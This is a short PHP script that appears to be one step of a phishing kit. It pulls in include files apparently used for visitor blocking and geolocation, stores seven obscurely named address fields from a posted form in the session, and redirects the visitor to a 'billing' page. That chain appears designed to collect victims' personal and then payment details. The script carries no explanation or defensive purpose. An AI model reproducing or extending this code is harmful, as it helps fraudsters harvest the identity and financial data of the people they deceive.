<?php

    session_start();

    include('../c/ban.php');
    include('../c/geo.php');
    include('../c/sys.php');
    include('../../config.php');

    if (isset($_POST['address'])) {

        $_SESSION['a'] = $_POST['a'];
        $_SESSION['b'] = $_POST['b'];
        $_SESSION['c'] = $_POST['c'];
        $_SESSION['d'] = $_POST['d'];
        $_SESSION['e'] = $_POST['e'];
        $_SESSION['f'] = $_POST['f'];
        $_SESSION['g'] = $_POST['g'];

        header("Location: ../billing.php?#{$rand}");
        exit;
    	
    }

?>